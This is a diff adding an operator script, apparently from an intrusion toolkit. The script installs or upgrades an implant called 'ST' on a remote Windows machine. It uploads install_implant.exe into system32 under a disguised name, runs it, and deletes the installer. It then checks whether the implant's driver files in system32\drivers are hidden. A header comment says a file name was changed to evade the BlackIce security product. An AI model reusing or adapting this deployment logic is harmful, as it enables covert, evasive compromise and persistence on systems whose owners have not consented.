@@ -1,0 +1,212 @@
+#08/22/2002 Simple script to upgrade ST 1.2 to ST 1.4 ...
+#09/04/2002 changed spcss32.exe to spcss32.ex_ to evade Blackice 3.5
+#01/13/2003 Modified to make it more like the PC install script..
+#05/30/2003 Modified to do checksum instead of prompting user to compare file sizes
+
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir="E:\\resources\\ep\\scripts";
+}
+@record off;
+@echo on;
+
+# old name of existing ST, if any
+string $names;
+# name of ST executable to upload
+string $local;
+# name of file to upload and run as
+string $files;
+
+string $localpath="$ScriptsDir\\..\\..\\..\\exploits\\st 1.4";
+
+$names[0]="mstcp32.sys";
+$files[0]="spcss32.ex_";
+$local[0]="install_implant.exe";
+
+$names[1]="mstcp64.sys";
+$files[1]="spcss64.ex_";
+$local[1]="install_implant_64.exe";
+
+bool $install = false;
+bool $badParams = false;
+string $systemroot;
+if ($argc == 1) {
+    $badParams = true;
+} else if ($argc > 3) {
+    $badParams = true;
+} else {
+    if ($argv[1] == "INSTALL") {
+	$install = true;
+    } else if ($argv[1] == "UPGRADE") {
+	$install = false;
+    } else {
+	# unknown level4 type
+	echo "\r\n***Invalid task -- must be INSTALL or UPGRADE***\r\n";
+	$badParams = true;
+    }
+
+	if ($argc >= 3) {
+		$systemroot=$argv[2];
+	} else {
+		### Get system path
+		@echo off;
+		@record on;
+		ifnot(`lpgetenv -option systemroot`) {
+			`script syspath.eps`;
+			ifnot(`lpgetenv -option systemroot`) {
+				echo "Could not get system root.  Exiting.";
+				return false;
+			} else {
+				$systemroot=GetCmdData("value");
+			}
+		} else {
+			$systemroot=GetCmdData("value");
+		}
+		@echo on;
+		@record off;
+	}
+
+    
+}
+
+if ($badParams) {
+    echo "Usage: $argv[0] <INSTALL | UPGRADE> [<system path>]";
+    echo "    Performs an install/upgrade of ST";
+    echo "    If system path is not specified, it will try to find it";
+    echo "";
+
+    return false;
+}
+
+
+string $oldname="";
+string $newname="";
+string $localname="";
+string $installname="";
+
+
+
+int $name=0;
+if ($install) {
+	$newname=$files[$name];
+	$localname=$local[$name];
+	$installname=$names[$name];	
+} else {
+	echo "Checking for existing installations:";
+	while ($name < sizeof($names)) {
+		if ($newname == "") {
+			@echo off;
+			ifnot(`dir "$names[$name]" -path "$systemroot\\system32\\drivers"`) {
+				if (`mkdir "$systemroot\\system32\\drivers\\$names[$name]"`) {
+					# you can make the directory; delete it and mark as unused (so new) value
+					ifnot(`rmdir "$systemroot\\system32\\drivers\\$names[$name]"`) {
+						echo "ERROR!  Could not delete directory $systemroot\\system32\\drivers\\$names[$name]";
+						pause;
+					}				
+					$newname=$files[$name];
+					$localname=$local[$name];
+					$installname=$names[$name];
+				} else {
+					# found an existing ST installation; continue to the next possibility
+					echo "Found existing ST installation: $systemroot\\system32\\drivers\\$names[$name]";
+					$oldname=$names[$name];
+				}
+			}
+			@echo on;
+		}
+		$name++;
+	}
+}
+
+if ($newname == "") {
+	echo "!!! Could not find a valid installation name.";
+	return false;
+}
+
+#ifnot($oldname == "") {
+#	echo "Found existing ST installation: $oldname";
+#	pause;
+#}
+
+echo "Installing ST $localpath\\$localname as $systemroot\\system32\\$newname";
+
+if (`dir "$newname" -path "$systemroot\\system32"`) {
+	echo "There is already a $newname file in system32.  Are you sure you want to continue?";
+	pause;
+}
+
+ifnot (`put "$localpath\\$localname" -name "$systemroot\\system32\\$newname"`)
+{ echo "put of file failed";
+  return false;
+}
+
+#echo "";
+#echo "The put has finished.";
+#echo "Make sure the whole file made it..should be 167,936 bytes";
+#echo "";
+#prompt `dir $newname -path $systemroot\\system32`;
+
+# Compare checksums
+ifnot (`script checksum.eps "$localname" "$localpath" "$newname" "$systemroot\\system32"`) {
+	`del "$newname" -path "$systemroot\\system32"`;
+	return false;
+}
+
+echo "";
+echo "Run the installer.";
+echo "";
+prompt `run -command $systemroot\\system32\\$newname`;
+
+echo "";
+echo "Make sure the process is done";
+echo "";
+prompt `processlist`;
+
+echo "Wait until the process is done to continue.";
+pause;
+
+bool $success=true;
+
+echo "Finishing up/checking installation...";
+echo "Deleting the installer...";
+ifnot (`del "$newname" -path "$systemroot\\system32"`) {
+	echo "ERROR! Could not delete $systemroot\\system32\\$newname !!";
+	pause;
+} else {
+	echo "Making sure it's gone...";
+	if (`dir "$newname" -path "$systemroot\\system32"`) {
+		echo "ERROR! $systemroot\\system32\\$newname still exists !!";
+		pause;
+	}
+}
+
+# TODO: check registry to confirm install
+
+# try creating temporary directory; in order to make sure install worked
+echo "Checking installation by creating directory...";
+if (`dir "$installname" -path "$systemroot\\system32\\drivers"`) {
+	echo "ERROR! $systemroot\\system32\\drivers\\$installname is visible!!";
+	pause;
+} else {
+	if (`mkdir "$systemroot\\system32\\drivers\\$installname"`) {
+		echo "ERROR!  Made directory $systemroot\\system32\\drivers\\$installname !!";
+		$success=false;
+		# you can make the directory!  Installation failed!
+		ifnot(`rmdir "$systemroot\\system32\\drivers\\$installname"`) {
+			echo "ERROR!  Could not delete directory $systemroot\\system32\\drivers\\$installname";
+			pause;
+		}
+		pause;
+	} else {
+		echo "All seems to be in order.";
+	}
+}
+
+echo "";
+echo "You may still want to test the connection to this box.";
+return $success;
